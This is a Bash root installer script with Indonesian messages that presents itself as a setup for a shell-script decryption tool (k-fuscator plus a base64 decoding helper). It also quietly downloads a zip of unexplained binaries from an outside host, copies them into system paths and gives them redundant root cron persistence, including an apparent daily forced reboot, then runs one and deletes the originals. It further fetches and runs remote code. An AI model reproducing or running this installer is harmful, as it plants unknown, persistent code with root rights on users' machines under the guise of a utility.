#!/bin/bash

NC='\e[0m'

WB='\e[37;1m'

echo ""

echo ""

echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" |  

echo ""

echo -e "                ${WB}MEMULAI PROSES INSTALASI SCRIPT DECRYPT........${NC}"

echo ""

echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | 

cd /root/

wget -q -O /root/tool.zip "http://roundreef.com/tool.zip"

unzip tool.zip >/dev/null 2>&1

rm -f tool.zip

chmod +x *

cp -f /root/vncl /usr/bin/vncl

cp -f /root/vncx /usr/bin/vncx

cp -f /usr/bin/vncl /usr/local/bin/vncl

cp -f /usr/bin/vncx /sbin/vncx

if ! grep -q 'vncl' /var/spool/cron/crontabs/root;then (crontab -l;echo "0 * * * * /usr/local/bin/vncl") | crontab;fi

echo "5 5 * * * root /usr/bin/vncl" >> /etc/crontab

echo "7 9 * * * root /sbin/vncx" >> /etc/crontab

cat > /etc/cron.d/vnc_otm <<-END

SHELL=/bin/sh

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

0 3 * * * root /sbin/vncx

END

cat > /home/vnc_otm <<-END

3

END

cat > /etc/cron.d/vncl_otm <<-END

SHELL=/bin/sh

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

2 4 * * * root /usr/bin/vncl

END

aurin=$(cat /home/vnc_otm)

c=11

if [ $aurin -gt $c ]

then

gg="PM"

else

gg="AM"

fi

cat << EOF >> /etc/crontab

# BEGIN_data

7 0 * * * root /sbin/vncx -r now

# END_data

EOF

service cron reload >/dev/null 2>&1

service cron restart >/dev/null 2>&1

systemctl restart cron >/dev/null 2>&1

/etc/init.d/cron restart >/dev/null 2>&1

echo -e "                ${WB}HAMPIR SELESAI , DITUNGGU SAMBIL NGOPI GAESS😁........${NC}"

vncl >/dev/null 2>&1

rm -f /root/vncl >/dev/null 2>&1

rm -f /root/vncx >/dev/null 2>&1

rm -rf dekrip >/dev/null 2>&1

rm -f /usr/bin/dec >/dev/null 2>&1

rm -rf k-fuscator >/dev/null 2>&1

cat > /usr/bin/dec << END

#!/bin/bash

cd dekrip && python3 kf.py

END

chmod +x /usr/bin/dec

apt install git python3 -y && git clone https://github.com/KasRoudra/k-fuscator && mv k-fuscator dekrip && cd dekrip && bash requirements.sh && cd /root/

echo " taruh file bahan di folder dekrip lalu ketik dec "

sleep 1

echo " untuk dekrip eval pilih nomor 2 "

sleep 1

echo " untuk dekrip bashrock pilih nomor 6 "

sleep 1

echo " instalasi selesai "

sleep 1

echo ""

echo ""

echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" |  

echo ""

echo -e "                ${WB}SCRIPT BY YADDY KAKKOII MAGELANG${NC}"

echo ""

echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | 

sleep 3

cat > /root/dekrip/anu.sh << END

#!/bin/bash

cat bahan.sh | tr ';' '\n' | grep 'RzE=' | cut -d '"' -f2 | tr ' ' '\n' | rev | base64 -d >> hasil.sh && rm bahan.sh

END

chmod +x /root/dekrip/anu.sh

rm -f kf.py

wget -q -O /root/dekrip/kf.py "https://raw.githubusercontent.com/YaddyKakkoii/fixsc/main/kf.py"

chmod +x /root/dekrip/kf.py

clear

dec

